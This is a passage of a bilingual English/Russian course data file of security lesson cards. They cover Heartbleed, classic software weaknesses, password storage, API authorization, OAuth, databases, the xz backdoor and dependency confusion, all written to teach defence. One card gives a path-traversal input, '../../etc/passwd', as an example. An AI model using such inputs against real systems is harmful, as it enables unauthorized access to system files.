    take: { en: `Check lengths and use OS protections; memory-safe languages remove the class entirely.`, ru: `Проверяйте длины и используйте защиту ОС; языки с безопасной памятью убирают класс целиком.` } },

  { id: 's11-041', kind: 'back', back: 's06-044', k: ['d8-c5', 'd3-c10'], lvl: 2,
    title: { en: `Heartbleed again: one missing length check`, ru: `Снова Heartbleed: одна пропущенная проверка длины` },
    body: {
      en: `<p>In stage 6, Heartbleed let anyone read pieces of a server's memory, including private keys, and the clean-up order mattered: patch, then new keys, then revoke, then passwords.</p><p>Now look at the cause. The heartbeat message said "here are 1 byte, send me back 64 KB". OpenSSL trusted the stated length instead of checking it against the real one, and copied 64 KB from memory. It's the overflow from the last card, reading instead of writing: a <b>buffer over-read</b>.</p><p>The crypto was fine. One unchecked number in C code broke the security of a large part of the web.</p>`,
      ru: `<p>На этапе 6 Heartbleed позволял любому читать куски памяти сервера, включая закрытые ключи, и порядок уборки был важен: патч, затем новые ключи, затем отзыв, затем пароли.</p><p>Теперь посмотрим на причину. Сообщение heartbeat говорило: «вот 1 байт, верни мне 64 КБ». OpenSSL поверил заявленной длине вместо сверки с настоящей и скопировал 64 КБ из памяти. Это переполнение из прошлой карточки, только чтение вместо записи: <b>чтение за пределами буфера</b>.</p><p>Криптография была в порядке. Одно непроверенное число в коде на C сломало защиту большой части веба.</p>`,
    },
    take: { en: `Heartbleed was a buffer over-read: trusting a length the attacker supplied.`, ru: `Heartbleed — чтение за пределами буфера: доверие длине, которую прислал злоумышленник.` } },

  { id: 's11-042', kind: 'vs', k: ['d8-c5', 'd3-c5'], lvl: 3,
    title: { en: `More classic weaknesses`, ru: `Ещё классические слабости` },
    body: {
      en: `<ul><li><b>Race condition / TOCTOU</b>: two actions interleave in an unexpected order; the check happens, then the thing checked changes before use.</li><li><b>Integer overflow</b>: a number too big for its type wraps or is cut. Ariane 5 (1996) self-destructed 37 seconds after launch when a velocity value, in code reused from Ariane 4, overflowed a 16-bit integer.</li><li><b>Path traversal</b>: <code>../../etc/passwd</code> in a filename reaches files outside the intended folder.</li><li><b>Insecure deserialization</b>: rebuilding objects from untrusted data runs code.</li><li><b>Hard-coded credentials</b>: a password baked into the code, the same on every copy.</li></ul>`,
      ru: `<ul><li><b>Состояние гонки / TOCTOU</b>: два действия переплетаются в неожиданном порядке; проверка прошла, а проверенное изменилось до использования.</li><li><b>Целочисленное переполнение</b>: число не влезает в тип и переворачивается или обрезается. Ariane 5 (1996) самоуничтожилась через 37 секунд после старта: значение скорости в коде, взятом от Ariane 4, переполнило 16-битное целое.</li><li><b>Обход пути</b>: <code>../../etc/passwd</code> в имени файла выводит за пределы нужной папки.</li><li><b>Небезопасная десериализация</b>: восстановление объектов из недоверенных данных выполняет код.</li><li><b>Зашитые учётные данные</b>: пароль в коде, одинаковый в каждой копии.</li></ul>`,
    },
    take: { en: `Races, integer overflows, path traversal, deserialization, hard-coded passwords: know them by name.`, ru: `Гонки, переполнение целых, обход пути, десериализация, зашитые пароли: знайте их по именам.` } },

  { id: 's11-043', kind: 'idea', k: ['d8-c5', 'd7-c2'], lvl: 2,
    title: { en: `Errors and logs: say little, record a lot`, ru: `Ошибки и журналы: говорить мало, записывать много` },
    body: {
      en: `<p>When something goes wrong, a program talks to two audiences.</p><p>To the <b>user</b>, it should say little: "Something went wrong, reference 4F2A." A stack trace, a database error or a server version in the page is a gift to an attacker.</p><p>To the <b>log</b>, it should say a lot: who, what, when, from where, and the reference number, so the support team and the SOC can follow it. But never the secrets themselves: no passwords, full card numbers or session tokens in logs.</p><p>And when an error happens in a security check, the program should <b>fail secure</b>: deny, not allow.</p>`,
      ru: `<p>Когда что-то идёт не так, программа говорит с двумя аудиториями.</p><p><b>Пользователю</b> — мало: «Что-то пошло не так, номер 4F2A». Трассировка стека, ошибка БД или версия сервера на странице — подарок злоумышленнику.</p><p><b>Журналу</b> — много: кто, что, когда, откуда и тот же номер, чтобы поддержка и SOC могли проследить. Но никогда не сами секреты: никаких паролей, полных номеров карт и токенов сессий в журналах.</p><p>А если ошибка случилась в проверке безопасности, программа должна <b>отказывать безопасно</b>: запрещать, а не разрешать.</p>`,
    },
    take: { en: `Generic errors for users, detailed logs without secrets, and fail secure.`, ru: `Общие ошибки для пользователя, подробные журналы без секретов и безопасный отказ.` } },

  { id: 's11-044', kind: 'back', back: 's06-033', k: ['d3-c8', 'd8-c5'], lvl: 2,
    title: { en: `Password storage again: the developer's checklist`, ru: `Снова хранение паролей: чек-лист разработчика` },
    body: {
      en: `<p>Stage 6 explained why passwords are stored with a unique <b>salt</b> and a deliberately <b>slow</b> function, after LinkedIn's unsalted hashes were cracked by the million.</p><p>For a developer, that turns into a short list:</p><ul><li>use a vetted library with Argon2id, bcrypt, scrypt or PBKDF2; never write your own;</li><li>never encrypt passwords (encryption can be reversed) and never use a fast hash such as plain SHA-256;</li><li>raise the work factor over time and rehash at the next login;</li><li>better still, use the company's identity provider or passkeys, so your app stores no passwords at all.</li></ul>`,
      ru: `<p>Этап 6 объяснил, почему пароли хранят с уникальной <b>солью</b> и намеренно <b>медленной</b> функцией, после того как несолёные хеши LinkedIn взламывали миллионами.</p><p>Для разработчика это превращается в короткий список:</p><ul><li>проверенная библиотека с Argon2id, bcrypt, scrypt или PBKDF2; никогда не писать своё;</li><li>никогда не шифровать пароли (шифрование обратимо) и не брать быстрый хеш вроде голого SHA-256;</li><li>со временем повышать коэффициент работы и перехешировать при следующем входе;</li><li>ещё лучше — корпоративный провайдер идентификации или passkeys, чтобы приложение вообще не хранило паролей.</li></ul>`,
    },
    take: { en: `Vetted slow hash with salt, never encryption, never your own; best of all, store no passwords.`, ru: `Проверенный медленный хеш с солью, не шифрование, не самоделка; лучше всего — не хранить паролей.` } },

  { id: 's11-045', kind: 'vs', k: ['d8-c5'], lvl: 2,
    title: { en: `OWASP Top 10 vs CWE Top 25 vs ASVS`, ru: `OWASP Top 10, CWE Top 25 и ASVS` },
    body: {
      en: `<ul><li><b>OWASP Top 10</b>: an awareness list of the ten biggest web application risk categories, updated every few years. Broken access control is at the top in both the 2021 and 2025 editions; injection, cryptographic failures and supply-chain problems are all on it.</li><li><b>CWE Top 25</b> (MITRE): the most dangerous specific software weaknesses, ranked from real vulnerability data. More precise, for every kind of software.</li><li><b>OWASP ASVS</b>: a <b>verification standard</b>, hundreds of testable requirements in levels, used to specify and check an application.</li></ul><p>Rule: Top 10 to teach, CWE to name the bug, ASVS to require and verify.</p>`,
      ru: `<ul><li><b>OWASP Top 10</b>: просветительский список десяти главных категорий рисков веб-приложений, обновляется раз в несколько лет. Нарушенный контроль доступа на первом месте и в выпуске 2021, и в выпуске 2025 года; инъекции, криптографические ошибки и проблемы цепочки поставок тоже в нём.</li><li><b>CWE Top 25</b> (MITRE): самые опасные конкретные слабости ПО, ранжированные по реальным данным об уязвимостях. Точнее и для любого ПО.</li><li><b>OWASP ASVS</b>: <b>стандарт проверки</b>, сотни проверяемых требований по уровням, чтобы задавать и проверять требования к приложению.</li></ul><p>Правило: Top 10 — учить, CWE — назвать ошибку, ASVS — требовать и проверять.</p>`,
    },
    take: { en: `OWASP Top 10 raises awareness, CWE names weaknesses, ASVS sets verifiable requirements.`, ru: `OWASP Top 10 — осведомлённость, CWE — имена слабостей, ASVS — проверяемые требования.` } },

  { id: 's11-046', kind: 'think', k: ['d8-c5', 'd3-c5'], lvl: 2,
    title: { en: `The handy debug endpoint`, ru: `Удобная отладочная точка` },
    body: {
      en: `<p>During a code review you find <code>/internal/debug?user=</code> in a customer-facing app. It shows any customer's full record, with no login. The developer explains: "It's only for support. Nobody knows the URL, and we'll remove it after launch." Launch was eight months ago.</p><p>What do you do?</p>`,
      ru: `<p>На ревью кода вы находите в клиентском приложении <code>/internal/debug?user=</code>. Он показывает полную запись любого клиента без входа. Разработчик объясняет: «Это только для поддержки. URL никто не знает, уберём после запуска». Запуск был восемь месяцев назад.</p><p>Что вы делаете?</p>`,
    },
    reveal: {
      en: `<p>Treat it as a live, serious vulnerability: it's a <b>maintenance hook</b> or backdoor, and "nobody knows the URL" is <b>security through obscurity</b>. URLs leak through logs, browser history, scanners and former staff.</p><p>Get it disabled now through an emergency change, not at the next release. Then check the access logs: if anyone outside support has called it, this may be an incident with personal data involved. Finally, give support a proper tool with login, role checks and logging, and add a rule to the pipeline or review checklist that catches debug routes before release.</p>`,
      ru: `<p>Считайте это действующей серьёзной уязвимостью: это <b>служебный вход (maintenance hook)</b>, то есть бэкдор, а «URL никто не знает» — <b>безопасность через неясность</b>. URL утекают через журналы, историю браузера, сканеры и бывших сотрудников.</p><p>Отключите его сейчас через экстренное изменение, а не в следующем релизе. Затем проверьте журналы доступа: если его вызывал кто-то кроме поддержки, это может быть инцидент с персональными данными. И наконец, дайте поддержке нормальный инструмент со входом, проверкой ролей и журналированием, а в конвейер или чек-лист ревью добавьте правило, ловящее отладочные маршруты до релиза.</p>`,
    },
    take: { en: `A hidden debug route is a backdoor; obscurity isn't access control. Disable, check logs, replace.`, ru: `Скрытый отладочный маршрут — бэкдор; неясность не контроль доступа. Отключить, проверить журналы, заменить.` } },

  { id: 's11-047', kind: 'idea', k: ['d8-c5', 'd5-c3'], lvl: 2,
    title: { en: `APIs: the front door with no receptionist`, ru: `API: парадная дверь без администратора` },
    body: {
      en: `<p>Modern apps are thin screens over <b>APIs</b>: the mobile app, the website and partners all call the same endpoints. An API has no screen to hide things behind, so every call must stand on its own:</p><ul><li><b>authenticate</b> every call, usually with a token;</li><li><b>authorize every object</b>: checking that you're logged in isn't enough; check that order 1043 is <i>yours</i>. Skipping this, called broken object level authorization (BOLA) or IDOR, is the top API risk;</li><li>return only the fields the client needs;</li><li><b>rate-limit</b>, so nobody can walk through all IDs from 1 to 10 million;</li><li>keep an inventory, including old versions nobody switched off.</li></ul>`,
      ru: `<p>Современные приложения — тонкие экраны над <b>API</b>: мобильное приложение, сайт и партнёры вызывают одни и те же конечные точки. У API нет экрана, за которым можно что-то спрятать, поэтому каждый вызов должен быть самодостаточным:</p><ul><li><b>аутентифицируйте</b> каждый вызов, обычно токеном;</li><li><b>авторизуйте каждый объект</b>: мало проверить, что вы вошли, нужно проверить, что заказ 1043 — <i>ваш</i>. Пропуск этой проверки (BOLA или IDOR) — главный риск API;</li><li>возвращайте только нужные клиенту поля;</li><li><b>ограничивайте частоту</b>, чтобы никто не перебрал все ID от 1 до 10 миллионов;</li><li>ведите опись, включая старые версии, которые никто не выключил.</li></ul>`,
    },
    take: { en: `Every API call: authenticate, authorize the specific object, return little, rate-limit.`, ru: `Каждый вызов API: аутентификация, авторизация конкретного объекта, минимум данных, лимит частоты.` } },

  { id: 's11-048', kind: 'back', back: 's04-026', k: ['d5-c3', 'd8-c5'], lvl: 2,
    title: { en: `Authorization again: in the code, on every request`, ru: `Снова авторизация: в коде, на каждом запросе` },
    body: {
      en: `<p>Stage 4 asked "who may do what to which thing?" and answered with models: DAC, MAC, RBAC, ABAC. Stage 7 added the reference monitor: one check that can't be bypassed.</p><p>In application code, those ideas become concrete rules:</p><ul><li>check on the <b>server</b>, every time; hiding a button in the interface isn't a check;</li><li>put the check in <b>one place</b> (a shared middleware or policy service), so no new endpoint forgets it;</li><li><b>deny by default</b>: an endpoint with no rule is closed, not open.</li></ul><p>Broken access control tops the OWASP list exactly because each endpoint gets its own hand-written check, and one is always missing.</p>`,
      ru: `<p>Этап 4 спрашивал: «кто может что делать с чем?» — и отвечал моделями: DAC, MAC, RBAC, ABAC. Этап 7 добавил монитор обращений: одну проверку, которую нельзя обойти.</p><p>В коде приложения эти идеи становятся конкретными правилами:</p><ul><li>проверять на <b>сервере</b>, каждый раз; спрятанная в интерфейсе кнопка — не проверка;</li><li>держать проверку в <b>одном месте</b> (общий middleware или сервис политик), чтобы новая конечная точка её не забыла;</li><li><b>запрет по умолчанию</b>: точка без правила закрыта, а не открыта.</li></ul><p>Нарушенный контроль доступа возглавляет список OWASP именно потому, что у каждой точки своя ручная проверка, и одной всегда не хватает.</p>`,
    },
    take: { en: `Server-side, centralized, deny-by-default: the reference monitor, written as code.`, ru: `На сервере, централизованно, запрет по умолчанию: монитор обращений в виде кода.` } },

  { id: 's11-049', kind: 'back', back: 's04-041', k: ['d5-c5', 'd8-c5'], lvl: 2,
    title: { en: `OAuth again: tokens for APIs`, ru: `Снова OAuth: токены для API` },
    body: {
      en: `<p>In stage 4, OAuth was how one app gets limited access to your data in another without your password, and OpenID Connect added "who you are" on top.</p><p>Inside your own software, the same tokens protect APIs. A few rules developers get wrong:</p><ul><li><b>validate</b> every token: signature, issuer, audience, expiry. A token for another API must be refused;</li><li>keep <b>scopes</b> narrow: "read orders", not "everything";</li><li>keep access tokens short-lived, and store refresh tokens carefully;</li><li>for apps in browsers and phones, use the authorization code flow with PKCE; the old implicit flow is deprecated.</li></ul>`,
      ru: `<p>На этапе 4 OAuth был способом дать одному приложению ограниченный доступ к вашим данным в другом без пароля, а OpenID Connect добавил сверху «кто вы».</p><p>Внутри собственного ПО те же токены защищают API. Несколько правил, в которых ошибаются разработчики:</p><ul><li><b>проверяйте</b> каждый токен: подпись, издателя, аудиторию, срок. Токен для другого API нужно отклонить;</li><li>держите <b>области (scopes)</b> узкими: «читать заказы», а не «всё»;</li><li>токены доступа — короткоживущие, токены обновления — храните бережно;</li><li>для приложений в браузере и телефоне — поток authorization code с PKCE; старый implicit flow устарел.</li></ul>`,
    },
    take: { en: `Validate signature, issuer, audience and expiry; narrow scopes; short-lived tokens; code flow with PKCE.`, ru: `Проверяйте подпись, издателя, аудиторию и срок; узкие scopes; короткие токены; code flow с PKCE.` } },

  { id: 's11-050', kind: 'idea', k: ['d8-c6'], lvl: 1,
    title: { en: `Databases: tables, keys and ACID`, ru: `Базы данных: таблицы, ключи и ACID` },
    body: {
      en: `<p>A relational database stores data in <b>tables</b> (relations). Each row is a <b>record</b> (tuple), each column an <b>attribute</b>.</p><p>When money moves, a transaction must be <b>ACID</b>:</p><ul><li><b>Atomic</b>: all of it happens or none of it. No debit without the matching credit.</li><li><b>Consistent</b>: the database moves from one valid state to another, obeying its rules.</li><li><b>Isolated</b>: transactions running at the same time don't see each other's half-finished work.</li><li><b>Durable</b>: once committed, it survives a crash.</li></ul><p>ACID is integrity, built into the database engine.</p>`,
      ru: `<p>Реляционная база хранит данные в <b>таблицах</b> (отношениях). Каждая строка — <b>запись</b> (кортеж), каждый столбец — <b>атрибут</b>.</p><p>Когда двигаются деньги, транзакция должна быть <b>ACID</b>:</p><ul><li><b>Атомарной</b>: всё или ничего. Никакого списания без соответствующего зачисления.</li><li><b>Согласованной</b>: база переходит из одного допустимого состояния в другое, соблюдая свои правила.</li><li><b>Изолированной</b>: одновременные транзакции не видят незавершённой работы друг друга.</li><li><b>Долговечной</b>: после фиксации переживает сбой.</li></ul><p>ACID — это целостность, встроенная в движок базы.</p>`,
    },
    take: { en: `ACID: atomic, consistent, isolated, durable. Integrity guaranteed by the database engine.`, ru: `ACID: атомарность, согласованность, изолированность, долговечность — целостность от движка БД.` } },

  { id: 's11-051', kind: 'vs', k: ['d8-c6'], lvl: 2,
    title: { en: `Keys, integrity, cardinality and degree`, ru: `Ключи, целостность, мощность и степень` },
    body: {
      en: `<ul><li><b>Primary key</b>: a column whose value uniquely identifies each row (customer ID). <b>Entity integrity</b>: it can't be empty or repeated.</li><li><b>Foreign key</b>: a column that points to another table's primary key (an order's customer ID). <b>Referential integrity</b>: it must point to a row that exists; no orders for customers who don't exist.</li><li><b>Candidate key</b>: any column that could serve as the primary key.</li><li><b>Cardinality</b>: the number of <b>rows</b>. <b>Degree</b>: the number of <b>columns</b>.</li></ul><p>Memory aid: degree is how wide the table is; cardinality is how long.</p>`,
      ru: `<ul><li><b>Первичный ключ</b>: столбец, значение которого однозначно определяет строку (ID клиента). <b>Целостность сущностей</b>: он не может быть пустым или повторяться.</li><li><b>Внешний ключ</b>: столбец, указывающий на первичный ключ другой таблицы (ID клиента в заказе). <b>Ссылочная целостность</b>: он должен указывать на существующую строку; никаких заказов несуществующих клиентов.</li><li><b>Потенциальный ключ</b>: любой столбец, который мог бы быть первичным ключом.</li><li><b>Мощность (cardinality)</b>: число <b>строк</b>. <b>Степень (degree)</b>: число <b>столбцов</b>.</li></ul><p>Подсказка: степень — ширина таблицы, мощность — длина.</p>`,
    },
    take: { en: `Primary key unique, foreign key must point to a real row; cardinality = rows, degree = columns.`, ru: `Первичный ключ уникален, внешний указывает на существующую строку; мощность — строки, степень — столбцы.` } },

  { id: 's11-052', kind: 'back', back: 's07-034', k: ['d8-c6', 'd2-c1', 'd3-c5'], lvl: 3,
    title: { en: `Aggregation and inference again: views and polyinstantiation`, ru: `Снова агрегация и вывод: представления и полиинстанцирование` },
    body: {
      en: `<p>In stage 7, two harmless lists combined into a secret, and a missing cargo record gave the secret away.</p><p>Databases have their own tools against both:</p><ul><li><b>Views</b>: a user queries a view that shows only the rows and columns they may see, never the base table. HR staff see names and departments, not salaries.</li><li><b>Cell- or row-level security</b>: rules in the database itself, so a missed check in the app doesn't expose everything.</li><li><b>Polyinstantiation</b>: two versions of the same record at different classification levels, so a lower-level user sees a cover story instead of a revealing gap.</li><li><b>Query limits and noise</b> against inference from statistics.</li></ul>`,
      ru: `<p>На этапе 7 два безобидных списка вместе давали секрет, а пропущенная запись о грузе выдавала тайну.</p><p>У баз данных есть свои средства против обоих:</p><ul><li><b>Представления (views)</b>: пользователь запрашивает представление, где видны только разрешённые ему строки и столбцы, а не базовую таблицу. Сотрудники HR видят имена и отделы, но не зарплаты.</li><li><b>Защита на уровне строк и ячеек</b>: правила в самой базе, чтобы пропущенная проверка в приложении не раскрыла всё.</li><li><b>Полиинстанцирование</b>: две версии записи на разных уровнях секретности, чтобы пользователь ниже видел легенду, а не выдающий пробел.</li><li><b>Ограничения запросов и шум</b> против вывода из статистики.</li></ul>`,
    },
    take: { en: `Views limit what each user sees; polyinstantiation hides gaps; row-level rules back up the app.`, ru: `Представления ограничивают видимое; полиинстанцирование прячет пробелы; правила строк страхуют приложение.` } },

  { id: 's11-053', kind: 'think', k: ['d8-c6'], lvl: 2,
    title: { en: `Two people, one last seat`, ru: `Два человека, одно последнее место` },
    body: {
      en: `<p>A ticketing app checks "is seat 14C free?", and if so, charges the card and saves the booking. On a busy night two customers click "buy" for 14C within the same second. Both pay; both get a confirmation.</p><p>What went wrong, and what's the fix?</p>`,
      ru: `<p>Приложение продажи билетов проверяет «свободно ли место 14C?», и если да, списывает деньги и сохраняет бронь. В загруженный вечер два клиента в одну секунду жмут «купить» на 14C. Оба платят, оба получают подтверждение.</p><p>Что пошло не так и как исправить?</p>`,
    },
    reveal: {
      en: `<p>A <b>race condition</b>, the database version of TOCTOU: both requests checked before either wrote, so both saw "free". It's an integrity failure, and it costs money and trust.</p><p>The fix belongs in the database's <b>concurrency control</b>: run check-and-book as one transaction with the right isolation level, lock the seat row while it's being booked, or let a unique constraint on (show, seat) reject the second booking, so the second payment is never taken. Testing should include many simultaneous requests, not one user at a time.</p>`,
      ru: `<p><b>Состояние гонки</b>, версия TOCTOU для базы данных: оба запроса проверили до того, как кто-то записал, и оба увидели «свободно». Это нарушение целостности, и оно стоит денег и доверия.</p><p>Исправление — в <b>управлении параллельным доступом</b> базы: проверка и бронь одной транзакцией с правильным уровнем изоляции, блокировка строки места на время брони или уникальное ограничение на (сеанс, место), которое отклонит вторую бронь, чтобы второй платёж не прошёл. В тесты нужно включить много одновременных запросов, а не по одному пользователю.</p>`,
    },
    take: { en: `Check-then-act across two requests is a race; use transactions, locks or unique constraints.`, ru: `«Проверить, потом сделать» в двух запросах — гонка; нужны транзакции, блокировки или уникальные ограничения.` } },

  { id: 's11-054', kind: 'idea', k: ['d8-c6', 'd2-c3'], lvl: 2,
    title: { en: `Warehouses, data mining and NoSQL`, ru: `Хранилища, интеллектуальный анализ и NoSQL` },
    body: {
      en: `<p>A <b>data warehouse</b> collects data from many systems into one place for analysis. That's useful, and it's also an aggregation problem: the warehouse often holds more sensitive combinations than any source system. Classify it at the level of what it can reveal, and limit who can run open-ended queries.</p><p><b>Data mining</b> finds patterns, such as fraud or buying habits; it can also infer things people never disclosed. <b>Metadata</b>, data about data, can be sensitive too.</p><p><b>NoSQL</b> stores (document, key-value, graph) scale easily but often ship with weaker defaults; several big leaks were unprotected databases left open to the internet.</p>`,
      ru: `<p><b>Хранилище данных (data warehouse)</b> собирает данные многих систем в одно место для анализа. Это полезно и одновременно задача агрегации: в хранилище часто больше чувствительных сочетаний, чем в любой исходной системе. Классифицируйте его по уровню того, что оно может раскрыть, и ограничьте круг тех, кто делает произвольные запросы.</p><p><b>Интеллектуальный анализ (data mining)</b> находит закономерности, например мошенничество или привычки покупателей, и может вывести то, чего люди не сообщали. <b>Метаданные</b>, данные о данных, тоже бывают чувствительными.</p><p>Хранилища <b>NoSQL</b> (документные, ключ-значение, графовые) легко масштабируются, но часто идут со слабыми настройками; несколько крупных утечек — незащищённые базы, открытые в интернет.</p>`,
    },
    take: { en: `Warehouses aggregate, so classify them high; mining infers; NoSQL needs hardening.`, ru: `Хранилища агрегируют — классифицируйте высоко; анализ выводит; NoSQL нужно укреплять.` } },

  { id: 's11-055', kind: 'story', k: ['d8-c7', 'd1-c13', 'd8-c8'], lvl: 2,
    title: { en: `xz utils 2024: the patient maintainer`, ru: `xz utils 2024: терпеливый сопровождающий` },
    body: {
      en: `<p>xz is a small compression tool in nearly every Linux system, maintained for years by one volunteer. From 2021 a contributor called "Jia Tan" sent helpful patches, while other accounts complained that the project was too slow. Worn out, the maintainer shared control. Jia Tan became co-maintainer.</p><p>In early 2024, versions 5.6.0 and 5.6.1 carried a hidden <b>backdoor</b> aimed at SSH logins, hidden in test files and release scripts, not in the visible source code.</p><p>Andres Freund, an engineer at Microsoft, noticed SSH logins taking half a second longer than usual, dug in, and reported it on 29 March 2024, before it reached most stable releases.</p>`,
      ru: `<p>xz — маленькая утилита сжатия почти в каждой системе Linux, которую годами сопровождал один доброволец. С 2021 года участник под именем «Jia Tan» присылал полезные патчи, а другие учётки жаловались, что проект движется слишком медленно. Измотанный сопровождающий разделил управление. Jia Tan стал сосопровождающим.</p><p>В начале 2024 года версии 5.6.0 и 5.6.1 несли скрытый <b>бэкдор</b>, нацеленный на входы по SSH, спрятанный в тестовых файлах и скриптах релиза, а не в видимом исходном коде.</p><p>Андрес Фройнд, инженер Microsoft, заметил, что вход по SSH стал на полсекунды дольше обычного, разобрался и сообщил об этом 29 марта 2024 года, до того как бэкдор попал в большинство стабильных выпусков.</p>`,
    },
    take: { en: `Open source runs on trust in people; a patient attacker can earn it over years.`, ru: `Открытый код держится на доверии к людям; терпеливый злоумышленник может заслужить его за годы.` } },

  { id: 's11-056', kind: 'idea', k: ['d8-c7'], lvl: 2,
    title: { en: `Open source: free to get, not free to own`, ru: `Открытый код: бесплатно взять, не бесплатно владеть` },
    body: {
      en: `<p>Open-source software is a huge gift: anyone can read it, fix it and use it. "Many eyes" can find bugs. But xz and Log4j both show the catch: <b>many eyes only help if someone looks</b>, and critical projects can rest on one or two unpaid people.</p><p>Using open source responsibly means:</p><ul><li>knowing what you use (SCA, SBOM);</li><li>checking a project's health before adopting it: maintainers, release history, how it handles security reports;</li><li>having someone own updates, because nobody will send you a patch;</li><li>respecting licences;</li><li>giving back: funding or contributing to what you depend on.</li></ul>`,
      ru: `<p>Открытое ПО — огромный подарок: любой может его прочитать, исправить и использовать. «Много глаз» могут найти ошибки. Но xz и Log4j показывают подвох: <b>много глаз помогают, только если кто-то смотрит</b>, а критичные проекты могут держаться на одном-двух неоплачиваемых людях.</p><p>Ответственно использовать открытый код — значит:</p><ul><li>знать, что вы используете (SCA, SBOM);</li><li>проверять здоровье проекта до внедрения: сопровождающие, история выпусков, как он обрабатывает сообщения об уязвимостях;</li><li>назначить ответственного за обновления, потому что патч вам никто не пришлёт;</li><li>соблюдать лицензии;</li><li>отдавать обратно: финансировать или участвовать в том, от чего зависите.</li></ul>`,
    },
    take: { en: `Open source is free to get but you own the risk: inventory, vet, update, comply, contribute.`, ru: `Открытый код бесплатен, но риск ваш: опись, проверка, обновления, лицензии, вклад.` } },

  { id: 's11-057', kind: 'vs', k: ['d8-c7', 'd1-c13'], lvl: 2,
    title: { en: `COTS vs open source vs custom vs SaaS`, ru: `Коробочное, открытое, заказное и SaaS` },
    body: {
      en: `<ul><li><b>COTS</b> (commercial off-the-shelf): bought as a product. No source code; you rely on the vendor's testing, patches and certifications. Ask for evidence.</li><li><b>Open source</b>: source available; you can inspect and fix it, but nobody owes you support unless you pay for it.</li><li><b>Custom, built by a third party</b>: written for you under contract. Put security requirements, testing and source-code ownership or escrow in the contract.</li><li><b>SaaS / managed service</b>: you don't install anything; you rely on the provider's operations. Assurance comes from SOC 2 reports, contracts and the shared responsibility model.</li></ul>`,
      ru: `<ul><li><b>COTS</b> (коробочное коммерческое ПО): покупается как продукт. Исходного кода нет; вы полагаетесь на тестирование, патчи и сертификаты поставщика. Требуйте доказательств.</li><li><b>Открытое ПО</b>: исходный код доступен; его можно проверить и исправить, но поддержку вам никто не должен, если вы за неё не платите.</li><li><b>Заказное у третьей стороны</b>: написано для вас по договору. Включите в договор требования безопасности, тестирование и владение исходным кодом или его депонирование.</li><li><b>SaaS / управляемый сервис</b>: вы ничего не устанавливаете и полагаетесь на эксплуатацию провайдера. Уверенность дают отчёты SOC 2, договоры и модель разделённой ответственности.</li></ul>`,
    },
    take: { en: `Each way of acquiring software shifts what you can see and what you must demand.`, ru: `Каждый способ получить ПО меняет то, что вы видите, и то, что должны требовать.` } },

  { id: 's11-058', kind: 'story', k: ['d8-c7', 'd8-c4'], lvl: 3,
    title: { en: `Dependency confusion 2021: the package with the right name`, ru: `Dependency confusion 2021: пакет с правильным именем` },
    body: {
      en: `<p>Large companies use internal software packages with names like <code>acme-billing-utils</code>, fetched from their own private registries. In 2021 a security researcher, Alex Birsan, noticed that many build tools also checked the <b>public</b> registries, and took the higher version number.</p><p>He found internal package names in leaked files and public code, then published harmless packages with those names and a higher version on npm, PyPI and RubyGems. Build servers inside more than 35 companies, including Apple, Microsoft and PayPal, downloaded and ran his code. He reported it through bug bounties and was paid over $130,000.</p>`,
      ru: `<p>Крупные компании используют внутренние пакеты с именами вроде <code>acme-billing-utils</code> из своих закрытых реестров. В 2021 году исследователь Алекс Бирсан заметил, что многие инструменты сборки проверяют и <b>публичные</b> реестры и берут большую версию.</p><p>Он нашёл имена внутренних пакетов в утёкших файлах и публичном коде и опубликовал безобидные пакеты с этими именами и большей версией в npm, PyPI и RubyGems. Сборочные серверы больше 35 компаний, включая Apple, Microsoft и PayPal, скачали и запустили его код. Он сообщил об этом через программы bug bounty и получил больше 130 000 долларов.</p>`,
    },
    take: { en: `Pin where each package comes from; an internal name on a public registry can win.`, ru: `Фиксируйте, откуда берётся каждый пакет; внутреннее имя в публичном реестре может победить.` } },

  { id: 's11-059', kind: 'think', k: ['d8-c7', 'd1-c13'], lvl: 2,
    title: { en: `The library that saves two weeks`, ru: `Библиотека, которая экономит две недели` },
    body: {
      en: `<p>A developer wants to add an open-source library that parses PDF invoices. It would save two weeks of work. It has 40 stars on GitHub, one maintainer, the last release 3 years ago, and 11 open issues, two of them labelled "security".</p><p>Approve it?</p>`,
      ru: `<p>Разработчик хочет добавить открытую библиотеку для разбора PDF-счетов. Она сэкономит две недели работы. У неё 40 звёзд на GitHub, один сопровождающий, последний выпуск три года назад и 11 открытых задач, две с меткой «security».</p><p>Одобрить?</p>`,
    },
    reveal: {
      en: `<p>Not as it is, but don't just say no either. A PDF parser handles <b>untrusted input</b>, exactly where memory and parsing bugs live, and this project looks abandoned, with security issues nobody is fixing.</p><p>Look for a better-maintained alternative first. If there isn't one and the business still wants it, it's a risk decision for the owner, with conditions: read the two security issues, fuzz it, run it in a sandbox with no network access, pin the version, and have a named person who will fork and patch it if needed. Record the decision so it gets reviewed.</p>`,
      ru: `<p>В таком виде — нет, но и просто отказать нельзя. Парсер PDF обрабатывает <b>недоверенный ввод</b>, ровно там живут ошибки памяти и разбора, а проект выглядит заброшенным, и проблемы безопасности никто не чинит.</p><p>Сначала поищите лучше сопровождаемую альтернативу. Если её нет, а бизнесу библиотека всё равно нужна, это решение о риске для владельца, с условиями: прочитать две задачи безопасности, профаззить, запускать в песочнице без доступа к сети, зафиксировать версию и назначить человека, который при необходимости сделает форк и исправит. Запишите решение, чтобы его пересматривали.</p>`,
    },
    take: { en: `Vet a dependency's health; unmaintained code parsing untrusted input needs an owner's decision and containment.`, ru: `Проверяйте здоровье зависимости; заброшенный код, разбирающий недоверенный ввод, требует решения владельца и изоляции.` } },

  { id: 's11-060', kind: 'idea', k: ['d8-c7', 'd1-c13'], lvl: 2,
    title: { en: `Buying software: what to ask for`, ru: `Покупка ПО: что требовать` },
    body: {
      en: `<p>When you buy software, you inherit its flaws. You can't review the code, so you review the vendor, and you write it into the contract:</p><ul><li>evidence of a secure development process: independent tests, certifications, a SOC 2 report;</li><li>an <b>SBOM</b> and a commitment to patch known vulnerabilities within set times;</li><li>how they'll tell you about vulnerabilities and breaches, and how fast;</li><li>the right to audit, or to receive audit results;</li><li><b>source code escrow</b>: a copy held by a neutral third party, released to you if the vendor goes bankrupt or stops supporting the product;</li><li>the support end date.</li></ul>`,
